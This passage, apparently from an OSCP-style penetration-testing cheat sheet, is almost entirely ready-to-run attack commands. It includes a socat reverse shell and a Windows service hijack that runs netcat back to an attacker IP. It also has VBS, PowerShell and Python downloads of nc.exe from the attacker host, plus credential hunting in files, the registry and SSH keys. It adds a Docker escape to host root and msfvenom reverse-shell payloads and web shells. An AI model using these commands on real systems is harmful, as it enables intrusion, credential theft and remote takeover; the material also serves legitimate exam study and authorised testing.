&lt;p&gt;target:&lt;br /&gt;
 &lt;code&gt;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:yourIP:4444&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;interactive-shell-upgrade-tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#interactive-shell-upgrade-tricks&#34;&gt;#&lt;/a&gt; Interactive Shell Upgrade Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Python (Linux)&lt;br /&gt;
 &lt;code&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python (Windows)&lt;br /&gt;
 &lt;code&gt;c:\python26\python.exe -c &#39;import pty; pty.spawn(&amp;quot;c:\\windows\\system32\\cmd.exe&amp;quot;)&#39; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Expect&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;sh.exp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/expect
spawn sh
interact
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Script&lt;br /&gt;
 &lt;code&gt;script /dev/null&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;inside-windows&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inside-windows&#34;&gt;#&lt;/a&gt; Inside Windows&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Get version&lt;br /&gt;
 &lt;code&gt;systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get users&lt;br /&gt;
 &lt;code&gt;net users&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get user info&lt;br /&gt;
 &lt;code&gt;net user &amp;lt;username&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)&lt;br /&gt;
 &lt;code&gt;netstat -ano&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Firewall status&lt;br /&gt;
 &lt;code&gt;netsh firewall show state&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;netsh firewall show config&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Scheduled tasks&lt;br /&gt;
List -  &lt;code&gt;schtasks /query /fo LIST /v&lt;/code&gt; &lt;br /&gt;
Create -  &lt;code&gt;schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR &amp;quot;mycommands&amp;quot;&lt;/code&gt; &lt;br /&gt;
Run -  &lt;code&gt;schtasks /Run /TN mytask&lt;/code&gt; &lt;br /&gt;
Delete -  &lt;code&gt;schtasks /Delete /TN mytask&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Running tasks&lt;br /&gt;
List -  &lt;code&gt;tasklist /SVC&lt;/code&gt; &lt;br /&gt;
Kill -  &lt;code&gt;taskkill /IM &amp;lt;exe name&amp;gt; /F&lt;/code&gt; &lt;br /&gt;
Kill -  &lt;code&gt;taskkill /PID &amp;lt;pid&amp;gt; /F&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Services&lt;br /&gt;
List -  &lt;code&gt;net start&lt;/code&gt; &lt;br /&gt;
Long name to key name  &lt;code&gt;sc getkeyname &amp;quot;long name&amp;quot;&lt;/code&gt; &lt;br /&gt;
Details -  &lt;code&gt;sc qc &amp;lt;key name&amp;gt;&lt;/code&gt; &lt;br /&gt;
Config -  &lt;code&gt;sc config &amp;lt;key name&amp;gt; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Low hanging fruits to grab&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Installers are running as elevated?&lt;br /&gt;
 &lt;code&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find interesting files&lt;br /&gt;
 &lt;code&gt;dir /s *pass* == *cred* == *vnc* == *.config*&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;findstr /si password *.xml *.ini *.txt&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find interesting registry entries&lt;br /&gt;
 &lt;code&gt;reg query HKLM /f password /t REG_SZ /s&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query HKCU /f password /t REG_SZ /s&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Permissions&lt;br /&gt;
Check detail on service -  &lt;code&gt;accesschk.exe /accepteula -ucqv &amp;lt;service name&amp;gt;&lt;/code&gt; &lt;br /&gt;
Find modifiable services -  &lt;code&gt;accesschk.exe /accepteula -uwcqv &amp;quot;Authenticated Users&amp;quot; *&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;accesschk.exe /accepteula -uwcqv &amp;quot;Users&amp;quot; *&lt;/code&gt; &lt;br /&gt;
Folder permissions -  &lt;code&gt;accesschk.exe -dqv &amp;lt;path&amp;gt;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;cacls &amp;lt;path&amp;gt;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;icacls &amp;lt;path\file&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Qick win on WinXP SP0/1&lt;br /&gt;
 &lt;code&gt;sc config upnphost binpath= &amp;quot;C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;sc config upnphost obj= &amp;quot;.\LocalSystem&amp;quot; password= &amp;quot;&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;sc config upnphost depend= &amp;quot;&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;net stop upnphost&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;net start upnphost&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Quick wins&lt;br /&gt;
 &lt;code&gt;reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query &amp;quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query&amp;quot; HKCU\Software\SimonTatham\PuTTY\Sessions&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query &amp;quot;HKCU\Software\ORL\WinVNC3\Password&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Download file with VBS&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;dim xHttp: Set xHttp = createobject(&amp;quot;Microsoft.XMLHTTP&amp;quot;)
dim bStrm: Set bStrm = createobject(&amp;quot;Adodb.Stream&amp;quot;)
xHttp.Open &amp;quot;GET&amp;quot;, &amp;quot;http://yourIp/nc.exe&amp;quot;, False
xHttp.Send

with bStrm
    .type = 1 \&#39;//binary
    .open
    .write xHttp.responseBody
    .savetofile &amp;quot;C:\\Users\\Public\\nc.exe&amp;quot;, 2 \&#39;//overwrite
end with
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Download with Powershell 3+&lt;br /&gt;
 &lt;code&gt;powershell -NoLogo -Command &amp;quot;Invoke-WebRequest -Uri &#39;https://yourIP/nc.exe&#39; -OutFile &#39;c:\Users\Public\Downloads\nc.exe&#39;&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Download with Powershell 2&lt;br /&gt;
 &lt;code&gt;powershell -NoLogo -Command &amp;quot;$webClient = new-object System.Net.WebClient; $webClient.DownloadFile(&#39;https://yourIP/nc.exe&#39;, &#39;c:\Users\Public\Download\nc.exe&#39;)&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Download with Python&lt;br /&gt;
 &lt;code&gt;c:\Python26\python.exe -c &amp;quot;import urllib; a=open(&#39;nc.exe&#39;, &#39;wb&#39;); a.write(urllib.urlopen(&#39;http://yourIP/nc.exe&#39;).read()); a.flush();a.close()&amp;quot; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows specific LPE vulns&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTExOTkv&#34;&gt;https://www.exploit-db.com/exploits/11199/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTgxNzYv&#34;&gt;https://www.exploit-db.com/exploits/18176/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTU2MDkv&#34;&gt;https://www.exploit-db.com/exploits/15609/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQyMjY5L2V4cGxvaXQ=&#34;&gt;https://www.securityfocus.com/bid/42269/exploit&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQ2MTM2L2V4cGxvaXQ=&#34;&gt;https://www.securityfocus.com/bid/46136/exploit&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;inside-linux&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inside-linux&#34;&gt;#&lt;/a&gt; Inside Linux&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Basic enumeration&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;System info&lt;br /&gt;
 &lt;code&gt;uname -a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Arch&lt;br /&gt;
 &lt;code&gt;uname -m&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Kernel&lt;br /&gt;
 &lt;code&gt;cat /proc/version	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Distro&lt;br /&gt;
 &lt;code&gt;cat /etc/*-release&lt;/code&gt;  or  &lt;code&gt;cat /etc/issue&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Filesystem&lt;br /&gt;
 &lt;code&gt;df -a	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Users&lt;br /&gt;
 &lt;code&gt;cat /etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Groups&lt;br /&gt;
 &lt;code&gt;cat /etc/group&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Super accounts&lt;br /&gt;
 &lt;code&gt;grep -v -E &amp;quot;^#&amp;quot; /etc/passwd | awk -F: &#39;$3 == 0 &amp;#123; print $1&amp;#125;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Currently logged in&lt;br /&gt;
 &lt;code&gt;finger&lt;/code&gt; ,  &lt;code&gt;w&lt;/code&gt; ,  &lt;code&gt;who -a&lt;/code&gt; ,  &lt;code&gt;pinky&lt;/code&gt; ,  &lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Last logged users&lt;br /&gt;
 &lt;code&gt;last&lt;/code&gt; ,  &lt;code&gt;lastlog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Cheeky test -&lt;br /&gt;
 &lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Anything interesting we can run as sudo?&lt;br /&gt;
 &lt;code&gt;sudo -l 2&amp;gt;/dev/null | grep -w &#39;nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb&#39; | xargs -r ls -la 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;History -&lt;br /&gt;
 &lt;code&gt;history&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Env vars&lt;br /&gt;
 &lt;code&gt;env&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Available shells&lt;br /&gt;
 &lt;code&gt;cat /etc/shells	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SUID files&lt;br /&gt;
 &lt;code&gt;find / -perm -4000 -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SUID owned by root&lt;br /&gt;
 &lt;code&gt;find / -uid 0 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;GUID files&lt;br /&gt;
 &lt;code&gt;find / -perm -2000 -type f 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;World writable&lt;br /&gt;
 &lt;code&gt;find / -perm -2 -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;World writable executed&lt;br /&gt;
 &lt;code&gt;find / ! -path &amp;quot;*/proc/*&amp;quot; -perm -2 -type f -print 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;World writable dirs&lt;br /&gt;
 &lt;code&gt;find / -perm -2 -type d 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;rhost files&lt;br /&gt;
 &lt;code&gt;find /home –name *.rhosts -print 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Plan files&lt;br /&gt;
 &lt;code&gt;find /home -iname *.plan -exec ls -la &amp;#123;&amp;#125; ; -exec cat &amp;#123;&amp;#125; 2&amp;gt;/dev/null ;	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;hosts.equiv&lt;br /&gt;
 &lt;code&gt;find /etc -iname hosts.equiv -exec ls -la &amp;#123;&amp;#125; 2&amp;gt;/dev/null ; -exec cat &amp;#123;&amp;#125; 2&amp;gt;/dev/null ;	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Can we peek at /root?&lt;br /&gt;
 &lt;code&gt;ls -ahlR /root/	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Find ssh files&lt;br /&gt;
 &lt;code&gt;find / -name &amp;quot;id_dsa*&amp;quot; -o -name &amp;quot;id_rsa*&amp;quot; -o -name &amp;quot;known_hosts&amp;quot; -o -name &amp;quot;authorized_hosts&amp;quot; -o -name &amp;quot;authorized_keys&amp;quot; 2&amp;gt;/dev/null |xargs -r ls -la&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Inetd&lt;br /&gt;
 &lt;code&gt;ls -la /usr/sbin/in.*	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Grep logs for loot&lt;br /&gt;
 &lt;code&gt;grep -l -i pass /var/log/*.log 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;What do we have in logs&lt;br /&gt;
 &lt;code&gt;find /var/log -type f -exec ls -la &amp;#123;&amp;#125; ; 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Find conf files in /etc&lt;br /&gt;
 &lt;code&gt;find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la &amp;#123;&amp;#125; ; 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;as above&lt;br /&gt;
 &lt;code&gt;ls -la /etc/*.conf	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;List open files&lt;br /&gt;
 &lt;code&gt;lsof -i -n	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Can we read root mail?&lt;br /&gt;
 &lt;code&gt;head /var/mail/root	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;What is running as root?&lt;br /&gt;
 &lt;code&gt;ps aux | grep root	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Lookup paths to running files&lt;br /&gt;
 &lt;code&gt;ps aux | awk &#39;&amp;#123;print $11&amp;#125;&#39;|xargs -r ls -la 2&amp;gt;/dev/null |awk &#39;!x[$0]++&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Exports and permissions of NFS&lt;br /&gt;
 &lt;code&gt;ls -la /etc/exports 2&amp;gt;/dev/null; cat /etc/exports 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;List sched jobs&lt;br /&gt;
 &lt;code&gt;ls -la /etc/cron*	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;List open connections (run with sudo/as root for more results)&lt;br /&gt;
 &lt;code&gt;lsof -i&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Installed pkgs:&lt;br /&gt;
 &lt;code&gt;dpkg -l&lt;/code&gt;  (debian),  &lt;code&gt;rpm -qa&lt;/code&gt;  (RH)&lt;/p&gt;
&lt;p&gt;sudo version?&lt;br /&gt;
 &lt;code&gt;sudo -V&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Available compilers&lt;br /&gt;
 &lt;code&gt;dpkg --list 2&amp;gt;/dev/null| grep compiler |grep -v decompiler 2&amp;gt;/dev/null &amp;amp;&amp;amp; yum list installed &#39;gcc*&#39; 2&amp;gt;/dev/null| grep gcc 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;docker-tips&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker-tips&#34;&gt;#&lt;/a&gt; Docker tips&lt;/h3&gt;
&lt;p&gt;Since most likely Docker runs as root if you can execute docker commands as unpriviledged user you can very likely use Docker&#39;s privs instead.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash&lt;/code&gt;  - note that the root folder from host is mounted as  &lt;code&gt;/host&lt;/code&gt; . You&#39;ll also see all processes running on host and be connected to same NICs.&lt;/p&gt;
&lt;p&gt;You may want to look into escaping UTS and IPC namespacing with  &lt;code&gt;--uts=host --ipc=host&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;upload-files-using-curl-with-webdav&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#upload-files-using-curl-with-webdav&#34;&gt;#&lt;/a&gt; Upload files using cUrl with WebDAV&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;curl -T nc.exe http://targetIP/nc.txt
curl -X MOVE -v -H &amp;quot;Destination:http://targetIP/nc.exe&amp;quot; http://targetIP/nc.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;msfvenom&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msfvenom&#34;&gt;#&lt;/a&gt; msfvenom&lt;/h2&gt;
&lt;h3 id=&#34;list-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#list-payloads&#34;&gt;#&lt;/a&gt; List payloads&lt;/h3&gt;
&lt;p&gt;msfvenom -l&lt;/p&gt;
&lt;h3 id=&#34;binaries&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#binaries&#34;&gt;#&lt;/a&gt; Binaries&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Linux&lt;br /&gt;
 &lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.elf&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows&lt;br /&gt;
 &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f exe &amp;gt; shell.exe&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mac&lt;br /&gt;
 &lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f macho &amp;gt; shell.macho&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;web-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-payloads&#34;&gt;#&lt;/a&gt; Web Payloads&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;PHP&lt;br /&gt;
 &lt;code&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.php&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;cat shell.php | pbcopy &amp;amp;&amp;amp; echo &#39;&amp;lt;?php &#39; | tr -d &#39;\n&#39; &amp;gt; shell.php &amp;amp;&amp;amp; pbpaste &amp;gt;&amp;gt; shell.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ASP&lt;br /&gt;
 &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f asp &amp;gt; shell.asp&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;JSP&lt;br /&gt;
 &lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.jsp&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;WAR&lt;br /&gt;
 &lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f war &amp;gt; shell.war&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;scripting-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scripting-payloads&#34;&gt;#&lt;/a&gt; Scripting Payloads&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Python&lt;br /&gt;
 &lt;code&gt;msfvenom -p cmd/unix/reverse_python LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.py&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bash&lt;br /&gt;
 &lt;code&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.sh&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Perl&lt;br /&gt;
 &lt;code&gt;msfvenom -p cmd/unix/reverse_perl LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.pl&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellcode&#34;&gt;#&lt;/a&gt; Shellcode&lt;/h3&gt;
&lt;p&gt;For all shellcode see  &lt;code&gt;msfvenom –help-formats&lt;/code&gt;  for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Linux Based Shellcode&lt;br /&gt;
 &lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows Based Shellcode&lt;br /&gt;
 &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mac Based Shellcode&lt;br /&gt;
 &lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;shellshock&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellshock&#34;&gt;#&lt;/a&gt; Shellshock&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-6271&lt;br /&gt;
 &lt;code&gt;env X=&#39;() &amp;#123; :; &amp;#125;; echo &amp;quot;CVE-2014-6271 vulnerable&amp;quot;&#39; bash -c id&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-7169&lt;br /&gt;
 &lt;code&gt;env X=&#39;() &amp;#123; (a)=&amp;gt;\&#39; bash -c &amp;quot;echo date&amp;quot;; cat echo&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-7186&lt;br /&gt;
 &lt;code&gt;bash -c &#39;true &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF&#39; || echo &amp;quot;CVE-2014-7186 vulnerable, redir_stack&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-7187&lt;br /&gt;
 &lt;code&gt;(for x in &amp;#123;1..200&amp;#125; ; do echo &amp;quot;for x$x in ; do :&amp;quot;; done; for x in &amp;#123;1..200&amp;#125; ; do echo done ; done) | bash || echo &amp;quot;CVE-2014-7187 vulnerable, word_lineno&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-6278&lt;br /&gt;
 &lt;code&gt;env X=&#39;() &amp;#123; _; &amp;#125; &amp;gt;_[$($())] &amp;#123; echo CVE-2014-6278 vulnerable; id; &amp;#125;&#39; bash -c :&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;references&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#references&#34;&gt;#&lt;/a&gt; References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zdXBwb3J0Lm9mZmVuc2l2ZS1zZWN1cml0eS5jb20vIyFvc2NwLWV4YW0tZ3VpZGUubWQ=&#34;&gt;OSCP Exam Guide&lt;/span&gt; - MUST read!&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2JpdHZpamF5cy5naXRodWIuaW8v&#34;&gt;The Magic of Learning&lt;/span&gt; - a real treasure trove!&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbQ==&#34;&gt;FuzzySecurity&lt;/span&gt; - this is something you must bookmark... period. I found the &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS90dXRvcmlhbHMvMTYuaHRtbA==&#34;&gt;Windows Privilege Escalation Fundamentals&lt;/span&gt; especially useful.&lt;/li&gt;
